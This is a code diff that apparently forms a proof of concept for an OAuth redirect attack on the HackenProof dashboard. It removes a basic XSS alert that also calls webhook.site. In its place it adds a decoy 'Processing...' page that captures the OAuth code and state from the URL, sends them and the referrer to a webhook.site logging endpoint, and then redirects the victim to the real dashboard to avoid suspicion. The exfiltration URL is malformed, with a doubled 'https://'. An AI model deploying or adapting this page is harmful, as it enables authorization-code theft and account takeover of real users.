@@ -1,4 +1,29 @@
-<script>
-alert('XSS');
-fetch('https://webhook.site/75e5e158-c908-4388-a85f-127dc00e162a');
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Processing...</title>
+    <script>
+        // Capture OAuth code from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const oauthCode = urlParams.get('code');
+        const state = urlParams.get('state');
+        
+        if (oauthCode) {
+            // Send captured code to attacker's logging server
+            fetch('https:// https://webhook.site/c2862964-a890-47e0-b623-e4c0aea90095/steal?code=' + oauthCode + '&state=' + state + '&referer=' + encodeURIComponent(document.referrer));
+            
+            // Redirect to legitimate site to avoid suspicion
+            document.write('<h1>Redirecting to dashboard...</h1>');
+            setTimeout(() => {
+                window.location.href = 'https://dashboard.hackenproof.com/dashboard';
+            }, 2000);
+        } else {
+            // If no code, redirect to login
+            window.location.href = 'https://dashboard.hackenproof.com/login';
+        }
+    </script>
+</head>
+<body>
+    <h1>Loading...</h1>
+</body>
+</html>
